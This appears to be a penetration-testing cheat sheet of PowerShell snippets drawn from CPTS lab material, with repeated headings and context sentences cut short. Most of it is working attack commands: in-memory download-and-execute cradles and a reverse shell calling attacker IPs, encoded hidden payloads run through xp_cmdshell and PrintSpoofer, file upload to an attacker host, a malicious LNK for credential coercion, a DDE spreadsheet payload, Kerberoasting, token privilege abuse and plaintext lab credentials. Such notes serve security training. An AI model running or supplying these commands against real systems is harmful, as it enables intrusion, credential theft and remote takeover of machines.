# Powershell

% powershell, windows, cpts

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-b64-encode-and-decode-2
#cat/CODE #cpts
```
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("_content"))
```

## Powershell - Powershell - Powershell - Powershell - Powershell - common-erros-with-powershell
#cat/CODE #cpts
```
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-b64-encoding-and-decoding
#cat/CODE #cpts
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-b64-encoding-and-decoding-2
#cat/CODE #cpts
```
echo <file>_content | base64 -d > hosts
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-web-upload
#cat/CODE #cpts
```
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-web-upload-2
#cat/CODE #cpts
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-web-upload-3
#cat/CODE #cpts
```
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-session-file-transfert
#cat/CODE #cpts
To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session conf

```
Test-NetConnection -ComputerName <ip>name -Port 5985
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-session-file-transfert-2
#cat/CODE #cpts
To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session conf

```
$Session = New-PSSession -ComputerName DATABASE01
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-session-file-transfert-3
#cat/CODE #cpts
Copy samplefile.txt from our Localhost to the DATABASE01 Session

```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-session-file-transfert-4
#cat/CODE #cpts
Copy DATABASE.txt from DATABASE01 Session to our Localhost

```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## Powershell - Powershell - Powershell - Powershell - Powershell - invoke-aesencryptionps1
#cat/CODE #cpts
Import Module Invoke-AESEncryption.ps1

```
Import-Module .\Invoke-AESEncryption.ps1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - invoke-aesencryptionps1-2
#cat/CODE #cpts
File Encryption Example

```
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

## Powershell - Powershell - Powershell - Powershell - Powershell - user-agents
#cat/CODE #cpts
```
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

## Powershell - Powershell - Powershell - Powershell - Powershell - user-agents-2
#cat/CODE #cpts
```
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows
#cat/CODE #cpts
Run a process from a remote file Download and execute a shell in memory

```
iex(New-Object Net.WebClient).DownloadString('http://10.10.15.43:8000/shell2.ps1')
```

## Powershell - Powershell - Powershell - Powershell - Powershell - interact-from-windows-powershell
#cat/CODE #cpts
```
$secpassword = ConvertTo-SecureString <password>word -AsPlainText -Force
```

## Powershell - Powershell - Powershell - Powershell - Powershell - interact-from-windows-powershell-2
#cat/CODE #cpts
```
$cred = New-Object System.Management.Automation.PSCredential <user>name, $secpassword
```

## Powershell - Powershell - Powershell - Powershell - Powershell - interact-from-windows-powershell-3
#cat/CODE #cpts
```
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell
#cat/CODE #cpts
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

## Powershell - Powershell - Powershell - Powershell - Powershell - inveigh-powershell---deprecated
#cat/CODE #cpts
```
Key Value
```

## Powershell - Powershell - Powershell - Powershell - Powershell - inveigh-powershell---deprecated-2
#cat/CODE #cpts
Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help)

```
WARNING:
```

## Powershell - Powershell - Powershell - Powershell - Powershell - applocker
#cat/CODE #cpts
An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software

```
PathConditions : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows-2
#cat/CODE #cpts
ActiveDirectory PowerShell Module The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at th

```
ModuleType Version Name ExportedCommands
```

## Powershell - Powershell - Powershell - Powershell - Powershell - downgrade-powershell
#cat/CODE #cpts
```
Name : ConsoleHost
```

## Powershell - Powershell - Powershell - Powershell - Powershell - targeting-a-single-user
#cat/CODE #cpts
```
Id : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
```

## Powershell - Powershell - Powershell - Powershell - Powershell - retrieving-all-tickets-using-setspnexe
#cat/CODE #cpts
```
Id : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
```

## Powershell - Powershell - Powershell - Powershell - Powershell - establishing-winrm-session-from-windows
#cat/CODE #cpts
Privileged Access

```
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
```

## Powershell - Powershell - Powershell - Powershell - Powershell - quick-checks-using-powershell
#cat/CODE #cpts
Living Off the Land

```
Get-ExecutionPolicy -List
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-base64-web-upload
#cat/CODE #cpts
Windows File Transfer Methods

```
echo <b64> | base64 -d -w 0 > hosts
```

## Powershell - Powershell - Powershell - Powershell - Powershell - file-encryption-example
#cat/CODE #cpts
Protected File Transfers

```
File encrypted to C:\htb\scan-results.txt.aes
```

## Powershell - Powershell - Powershell - Powershell - Powershell - listing-out-user-agents
#cat/CODE #cpts
Evading Detection

```
Name : InternetExplorer
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows-powershell
#cat/CODE #cpts
Interacting with Common Services

```
Directory: \\192.168.220.129\Finance
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows-powershell-2
#cat/CODE #cpts
Instead of `net use`, we can use `New-PSDrive` in PowerShell. Interacting with Common Services

```
Name Used (GB) Free (GB) Provider Root CurrentLocation
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows-powershell---gci
#cat/CODE #cpts
Interacting with Common Services

```
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows-powershell---gci-2
#cat/CODE #cpts
We can use the property `-Include` to find specific items from the directory specified by the Path parameter. Interacting with Common Services

```
Directory: N:\Contracts\private
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows-powershell---select-string
#cat/CODE #cpts
Interacting with Common Services

```
N:\Contracts\private\secret.txt:1:file with all credentials
```

## Powershell - Powershell - Powershell - Powershell - Powershell - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433
#cat/CODE #cpts
```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAHIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAaQByAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8
```

## Powershell - Powershell - Powershell - Powershell - Powershell - locate-a-configuration-file-containing-an-mssql-connection-string-what
#cat/CODE #cpts
Then, from MS01, students need to use the shared drive to move `Snaffler.exe` to the Desktop. Using the previously established PowerShell session, students need use `runas` to launch a new PowerShell session as the `BR08

```
runas /netonly /user:INLANEFREIGHT\BR086 powershell
```

## Powershell - Powershell - Powershell - Powershell - Powershell - locate-a-configuration-file-containing-an-mssql-connection-string-what-2
#cat/CODE #cpts
```
Enter the password for INLANEFREIGHT\BR086:
```

## Powershell - Powershell - Powershell - Powershell - Powershell - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/CODE #cpts
Then, students will run the encoded PowerShell payload from the `xp_cmdshell` `PrintSpoofer`:

```
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBi
```

## Powershell - Powershell - Powershell - Powershell - Powershell - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/CODE #cpts
```
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFc
```

## Powershell - Powershell - Powershell - Powershell - Powershell - obtain-credentials-for-a-user-who-has-genericall-rights-over-the-domai
#cat/CODE #cpts
Once the `Inveigh.ps1` is on the Windows host, it can be imported and invoked:

```
Import-Module .\Inveigh.ps1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - windows-dosfuscation
#cat/CODE #cpts
We can even use `tutorial` to see an example of how the tool works. Once we are set, we can start using the tool, as follows:

```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
```

## Powershell - Powershell - Powershell - Powershell - Powershell - abusing-built-in-functionality
#cat/CODE #cpts
We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

```
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - retrieving-hardcoded-credentials-from-thick-client-applications-5
#cat/CODE #cpts
Listing the content of the `6F39` batch file reveals the following.

```
powershell.exe -exec bypass -file c:\programdata\monta.ps1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - 4-dde-dynamic-data-exchange-client-side-but-server-triggered
#cat/CODE #cpts
If the server **generates** a CSV/Excel file from user input and sends it back:

```
=cmd | ' /C powershell -nop -w hidden ...'!A1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enumerate-the-application-for-vulnerabilities-gain-remote-code-executi
#cat/CODE #cpts
```
(Meterpreter 13)(C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain) >
```

## Powershell - Powershell - Powershell - Powershell - Powershell - listing-named-pipes-with-powershell
#cat/CODE #cpts
```
Directory: \\.\pipe
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
Enable-Privilege -Privilege SeBackupPrivilege
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-2
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
Enable-Privilege -Privilege SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-3
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
If ($PSCmdlet.ShouldProcess("Process ID: $PID", "Enable Privilege(s): $($Privilege -join ', ')")) {
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-4
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$SE_PRIVILEGE_ENABLED = 0x00000002
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-5
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$SE_PRIVILEGE_DISABLED = 0x00000000
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-6
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$TOKEN_QUERY = 0x00000008
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-7
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$TOKEN_ADJUST_PRIVILEGES = 0x00000020
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-8
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$TokenPriv = New-Object TokPriv1Luid
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-9
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$HandleToken = [intptr]::Zero
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-10
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$TokenPriv.Count = 1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-11
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$TokenPriv.Attr = $SE_PRIVILEGE_ENABLED
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-12
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$Return = [PoshPrivilege]::OpenProcessToken(
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-13
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
($TOKEN_QUERY -BOR $TOKEN_ADJUST_PRIVILEGES)
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-14
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$PrivValue = $Null
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-15
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$TokenPriv.Luid = 0
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-16
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$Return = [PoshPrivilege]::LookupPrivilegeValue($Null, $Priv, [ref]$PrivValue)
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-17
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$TokenPriv.Luid = $PrivValue
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-18
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$return = [PoshPrivilege]::AdjustTokenPrivileges(
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-19
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$HandleToken
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enabling-privileges-20
#cat/CODE #cpts
https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1

```
$False
```

## Powershell - Powershell - Powershell - Powershell - Powershell - another-method-is
#cat/CODE #cpts
The process has a PID of 552. Let's import psgetsys.ps1 and try to get a reverse shell.

```
ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c
```

## Powershell - Powershell - Powershell - Powershell - Powershell - modifying-the-file-acl
#cat/CODE #cpts
We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```
cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
```

## Powershell - Powershell - Powershell - Powershell - Powershell - copying-a-protected-file
#cat/CODE #cpts
As we can see above, the privilege was enabled successfully. This privilege can now be leveraged to copy any protected file.

```
cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
```

## Powershell - Powershell - Powershell - Powershell - Powershell - adding-local-admin-with-printnightmare-powershell-poc-2
#cat/CODE #cpts
Now we can import the PowerShell script and use it to add a new local admin user.

```
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - modifying-powershell-poc
#cat/CODE #cpts
For our purposes, we want to modify the `$cmd` variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

## Powershell - Powershell - Powershell - Powershell - Powershell - modifying-powershell-poc-2
#cat/CODE #cpts
Modify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.

```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - reading-powershell-history-file
#cat/CODE #cpts
Once we know the file's location (the default path is above), we can attempt to read its contents using `gc`.

```
cd Temp
```

## Powershell - Powershell - Powershell - Powershell - Powershell - reading-powershell-history-file-2
#cat/CODE #cpts
Once we know the file's location (the default path is above), we can attempt to read its contents using `gc`.

```
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
```

## Powershell - Powershell - Powershell - Powershell - Powershell - reading-powershell-history-file-3
#cat/CODE #cpts
Once we know the file's location (the default path is above), we can attempt to read its contents using `gc`.

```
Get-IISsite -Server WEB02 -web "Default Web Site"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-credentials
#cat/CODE #cpts
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API

```
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-credentials-2
#cat/CODE #cpts
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API

```
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
```

## Powershell - Powershell - Powershell - Powershell - Powershell - decrypting-powershell-credentials
#cat/CODE #cpts
If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

```
bob
```

## Powershell - Powershell - Powershell - Powershell - Powershell - decrypting-powershell-credentials-2
#cat/CODE #cpts
Run commands as another user

```
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}
```

## Powershell - Powershell - Powershell - Powershell - Powershell - search-file-contents-with-powershell
#cat/CODE #cpts
We can also search using PowerShell in a variety of ways. Here is one example.

```
stuff.txt:1:password: l#-x9r11_2_GL!
```

## Powershell - Powershell - Powershell - Powershell - Powershell - search-for-file-extensions-using-powershell
#cat/CODE #cpts
```
Directory: C:\inetpub\wwwroot
```

## Powershell - Powershell - Powershell - Powershell - Powershell - other-interesting-files
#cat/CODE #cpts
```
Some other files we may find credentials in include the following:
```

## Powershell - Powershell - Powershell - Powershell - Powershell - alternate-data-streams-ads
#cat/CODE #cpts
ADS is a feature of the NTFS filesystem that allows a file to contain multiple "streams" of data — essentially hidden data attached to a file that doesn't show up in normal directory listings or affect the visible file s

```
Get-ChildItem -Recurse | ForEach-Object { Get-Item $_.FullName -Stream * } | Where-Object Stream -ne ':$DATA'
```

## Powershell - Powershell - Powershell - Powershell - Powershell - alternate-data-streams-ads-2
#cat/CODE #cpts
ADS is a feature of the NTFS filesystem that allows a file to contain multiple "streams" of data — essentially hidden data attached to a file that doesn't show up in normal directory listings or affect the visible file s

```
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - running-sessiongopher-as-current-user
#cat/CODE #cpts
We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.

```
PuTTY Sessions
```

## Powershell - Powershell - Powershell - Powershell - Powershell - running-sessiongopher-as-current-user-2
#cat/CODE #cpts
We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.

```
Putty Session : Default Settings
```

## Powershell - Powershell - Powershell - Powershell - Powershell - running-monitor-script-on-target-host
#cat/CODE #cpts
We can host the script on our attack machine and execute it on the target host as follows.

```
InputObject SideIndicator
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file
#cat/CODE #cpts
```
$objShell = New-Object -ComObject WScript.Shell
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file-2
#cat/CODE #cpts
```
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file-3
#cat/CODE #cpts
```
$lnk.TargetPath = "\\<lhost>\@pwn.png"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file-4
#cat/CODE #cpts
```
$lnk.WindowStyle = 1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file-5
#cat/CODE #cpts
```
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file-6
#cat/CODE #cpts
```
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file-7
#cat/CODE #cpts
```
$lnk.HotKey = "Ctrl+Alt+O"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - generating-a-malicious-lnk-file-8
#cat/CODE #cpts
```
$lnk.Save()
```

## Powershell - Powershell - Powershell - Powershell - Powershell - get-installed-programs-via-powershell-registry-keys
#cat/CODE #cpts
```
DisplayName DisplayVersion InstallLocation
```

## Powershell - Powershell - Powershell - Powershell - Powershell - powershell-script---invoke-sharpchromium
#cat/CODE #cpts
```
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
```

## Powershell - Powershell - Powershell - Powershell - Powershell - invoke-sharpchromium-cookies-extraction
#cat/CODE #cpts
```
Chromium Cookie (User: lab_admin)
```

## Powershell - Powershell - Powershell - Powershell - Powershell - capture-credentials-from-the-clipboard-with-invoke-clipboardlogger
#cat/CODE #cpts
```
Sup9rC0mpl2xPa$$ws0921lk
```

## Powershell - Powershell - Powershell - Powershell - Powershell - enumerating-scheduled-tasks-with-powershell
#cat/CODE #cpts
We can also enumerate scheduled tasks using the [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps) PowerShell cmdlet.

```
TaskName State
```

## Powershell - Powershell - Powershell - Powershell - Powershell - migrating-to-a-64-bit-process
#cat/CODE #cpts
Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the `smb_delivery`

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
```

## Powershell - Powershell - Powershell - Powershell - Powershell - find-a-backup-script-that-contains-the-password-for-the-backupadm-user
#cat/CODE #cpts
```
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
```

## Powershell - Powershell - Powershell - Powershell - Powershell - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-2
#cat/CODE #cpts
```
$mySrvConn.ServerInstance=$serverName
```

## Powershell - Powershell - Powershell - Powershell - Powershell - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-3
#cat/CODE #cpts
```
$mySrvConn.LoginSecure = $false
```

## Powershell - Powershell - Powershell - Powershell - Powershell - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-4
#cat/CODE #cpts
```
$mySrvConn.Login = "backupadm"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-5
#cat/CODE #cpts
```
$mySrvConn.Password = "!qazXSW@"
```

## Powershell - Powershell - Powershell - Powershell - Powershell - obtain-the-ntlmv2-password-hash-for-the-mpalledorous-user-and-crack-it
#cat/CODE #cpts
Students can use any file transfer technique, however, the easiest is copying and pasting: Subsequently, students need to run PowerShell as Administrator, utilizing the credentials `.\ilfserveradm:Sys26Admin`: Then, stud

```
cd C:\Users\ilfserveradm\Desktop\
```

## Powershell - Powershell - Powershell - Powershell - Powershell - obtain-the-ntlmv2-password-hash-for-the-mpalledorous-user-and-crack-it-2
#cat/CODE #cpts
Students can use any file transfer technique, however, the easiest is copying and pasting: Subsequently, students need to run PowerShell as Administrator, utilizing the credentials `.\ilfserveradm:Sys26Admin`: Then, stud

```
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

## Powershell - Powershell - Powershell - Powershell - Powershell - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the
#cat/CODE #cpts
Students now need to create a `PScredential` object, then use `Set-DomainObject` to set a fake SPN on the target account:

```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
```

## Powershell - Powershell - Powershell - Powershell - Powershell - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-2
#cat/CODE #cpts
Students now need to create a `PScredential` object, then use `Set-DomainObject` to set a fake SPN on the target account:

```
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

## Powershell - Powershell - Powershell - Powershell - Powershell - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-3
#cat/CODE #cpts
Students now need to create a `PScredential` object, then use `Set-DomainObject` to set a fake SPN on the target account:

```
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

## Powershell - Powershell - Powershell - Powershell - Powershell - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-4
#cat/CODE #cpts
```
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
```

## Powershell - Powershell - Powershell - Powershell - Powershell - set-a-fake-spn-on-the-ttimmons-user-kerberoast-this-user-and-crack-the-5
